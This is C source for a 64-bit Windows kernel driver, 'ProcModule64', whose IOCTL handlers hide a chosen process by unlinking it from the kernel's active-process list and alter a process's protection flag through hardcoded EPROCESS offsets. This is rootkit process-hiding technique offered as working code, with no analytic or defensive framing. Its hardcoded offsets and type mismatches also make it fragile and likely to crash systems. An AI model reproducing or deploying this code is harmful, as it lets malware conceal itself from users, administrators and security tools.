﻿#include <ntddk.h>
#include <windef.h>
#include <stdlib.h>

//Symbolic link
#define	DEVICE_NAME			L"\\Device\\ProcModule64"
#define LINK_NAME			L"\\DosDevices\\ProcModule64"
#define LINK_GLOBAL_NAME	L"\\DosDevices\\Global\\ProcModule64"

// Provide a unique system I/O control code for each functions
#define IOCTL_IO_PROTECT		CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_IO_HIDE		CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Define undocumented kernal api
NTKERNELAPI NTSTATUS PsLookupProcessByProcessId(HANDLE ProcessId, PEPROCESS *Process);
NTKERNELAPI CHAR* PsGetProcessImageFileName(PEPROCESS Process);

// Define offset of special element in EPROCESS structure 
#define PROCESS_ACTIVE_PROCESS_LINKS_OFFSET	0x188
#define PROCESS_FLAG_OFFSET					0x440

PEPROCESS GetProcessObjectByPID(DWORD *PID);
VOID RemoveListEntry(PLIST_ENTRY ListEntry);
ULONG ProtectProcess(PEPROCESS Process, BOOLEAN bIsProtect, ULONG v);
VOID HideProcess(PEPROCESS Process);

//Unload
VOID DriverUnload(PDRIVER_OBJECT pDriverObj)
{	
	UNICODE_STRING strLink;
	DbgPrint("ProcModule64 DriverUnload\n");
	//Delete symbolic link
	RtlInitUnicodeString(&strLink, LINK_NAME);
	IoDeleteSymbolicLink(&strLink);
	IoDeleteDevice(pDriverObj->DeviceObject);
}

// IRP_MJ_CREATE I/O function code
NTSTATUS DispatchCreate(PDEVICE_OBJECT pDevObj, PIRP pIrp)
{
	DbgPrint("ProcModule64 DispatchCreate\n");
	pIrp->IoStatus.Status = STATUS_SUCCESS;
	pIrp->IoStatus.Information = 0;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

// IRP_MJ_CLOSE I/O function code
NTSTATUS DispatchClose(PDEVICE_OBJECT pDevObj, PIRP pIrp)
{
	DbgPrint("ProcModule64 DispatchClose\n");
	pIrp->IoStatus.Status = STATUS_SUCCESS;
	pIrp->IoStatus.Information = 0;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

//IRP_MJ_CONTROL I/O function code
NTSTATUS DispatchIoctl(PDEVICE_OBJECT pDevObj, PIRP pIrp)
{
	NTSTATUS status = STATUS_INVALID_DEVICE_REQUEST;
	PIO_STACK_LOCATION pIrpStack;
	ULONG uIoControlCode;
	PVOID pIoBuffer;
	ULONG uInSize;
	ULONG uOutSize;
	ULONG op_dat;

	int	PROCPID = 0;
	PEPROCESS ProcEP = NULL;

	DbgPrint("ProcModule64 DispatchIoctl\n");
	//Get IRP data
	pIrpStack = IoGetCurrentIrpStackLocation(pIrp);
	uIoControlCode = pIrpStack->Parameters.DeviceIoControl.IoControlCode;
	//Get IO buffer
	pIoBuffer = pIrp->AssociatedIrp.SystemBuffer;						
	//Buffer in size
	uInSize = pIrpStack->Parameters.DeviceIoControl.InputBufferLength;	
	//Buffer out size
	uOutSize = pIrpStack->Parameters.DeviceIoControl.OutputBufferLength;
	switch(uIoControlCode)
	{
		// Define all dispatch interfaces
		case IOCTL_IO_PROTECT:
		{	
			// Get process pid from ring0
			PROCPID = *((DWORD *)pIoBuffer);
						
			ProcEP=GetProcessObjectByPID(PROCPID);
			if(ProcEP)
			{
				op_dat=ProtectProcess(ProcEP,1,0);
				ObDereferenceObject(ProcEP);
				status = STATUS_SUCCESS;
				DbgPrint("The process with PID %d is protected\n",PROCPID);
			}			
			break;
		}
		case IOCTL_IO_HIDE:
		{
			// Get process pid from ring0
			PROCPID = *((DWORD *)pIoBuffer);
			DbgPrint("The Input PID is :%d\r\n",PROCPID);			
			ProcEP=GetProcessObjectByPID(PROCPID);
			if(ProcEP)
			{
				HideProcess(ProcEP);
				ObDereferenceObject(ProcEP);
				status = STATUS_SUCCESS;
				DbgPrint("The process with PID %d is hidden\n",PROCPID);
			}			
			break;
		}
	}
	// Set return status
	if(status == STATUS_SUCCESS)
		pIrp->IoStatus.Information = uOutSize;	
	else
		pIrp->IoStatus.Information = 0;	
	pIrp->IoStatus.Status = status;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return status;
}

// Main. Initialize device
NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObj, PUNICODE_STRING pRegistryString)
{
	NTSTATUS status = STATUS_SUCCESS;
	UNICODE_STRING ustrLinkName;
	UNICODE_STRING ustrDevName;  
	PDEVICE_OBJECT pDevObj;
	// Dispatch
	pDriverObj->MajorFunction[IRP_MJ_CREATE] = DispatchCreate;
	pDriverObj->MajorFunction[IRP_MJ_CLOSE] = DispatchClose;
	pDriverObj->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchIoctl;
	pDriverObj->DriverUnload = DriverUnload;
	//Create a device
	RtlInitUnicodeString(&ustrDevName, DEVICE_NAME);
	status = IoCreateDevice(pDriverObj, 0, &ustrDevName, FILE_DEVICE_UNKNOWN, 0, FALSE, &pDevObj);
	if(!NT_SUCCESS(status))	return status;
	//Get version
	if(IoIsWdmVersionAvailable(1, 0x10))
		RtlInitUnicodeString(&ustrLinkName, LINK_GLOBAL_NAME);
	else
		RtlInitUnicodeString(&ustrLinkName, LINK_NAME);
	//create symbolic link
	status = IoCreateSymbolicLink(&ustrLinkName, &ustrDevName);  	
	if(!NT_SUCCESS(status))
	{
		IoDeleteDevice(pDevObj); 
		return status;
	}
	DbgPrint("ProcModule64 DriverEntry\n");
	return STATUS_SUCCESS;
}

// Get EPROCESS Structure
PEPROCESS GetProcessObjectByPID(DWORD *PID)
{
	NTSTATUS st;
	PEPROCESS ep;
	st=PsLookupProcessByProcessId((HANDLE)PID,&ep);
	if(NT_SUCCESS(st))
	{
		char *pn=PsGetProcessImageFileName(ep);
		return ep;
	} else {
		return NULL;
	}
}

// Break the two-way linked list of EPROCESS stuct
VOID RemoveListEntry(PLIST_ENTRY ListEntry)
{
	KIRQL OldIrql;
	OldIrql = KeRaiseIrqlToDpcLevel();
	if (ListEntry->Flink != ListEntry &&
		ListEntry->Blink != ListEntry &&
		ListEntry->Blink->Flink == ListEntry &&
		ListEntry->Flink->Blink == ListEntry) 
	{
			ListEntry->Flink->Blink = ListEntry->Blink;
			ListEntry->Blink->Flink = ListEntry->Flink;
			ListEntry->Flink = ListEntry;
			ListEntry->Blink = ListEntry;
	}
	KeLowerIrql(OldIrql);
}

// Protect Process
ULONG ProtectProcess(PEPROCESS Process, BOOLEAN bIsProtect, ULONG v)
{
	ULONG op;
	if(bIsProtect)
	{
		op=*(PULONG)((ULONG64)Process+PROCESS_FLAG_OFFSET);
		*(PULONG)((ULONG64)Process+PROCESS_FLAG_OFFSET)=0;
		return op;
	}
	else
	{
		*(PULONG)((ULONG64)Process+PROCESS_FLAG_OFFSET)=v;
		return 0;
	}
}

// Hide Process
VOID HideProcess(PEPROCESS Process)
{
	RemoveListEntry((PLIST_ENTRY)((ULONG64)Process+PROCESS_ACTIVE_PROCESS_LINKS_OFFSET));
}
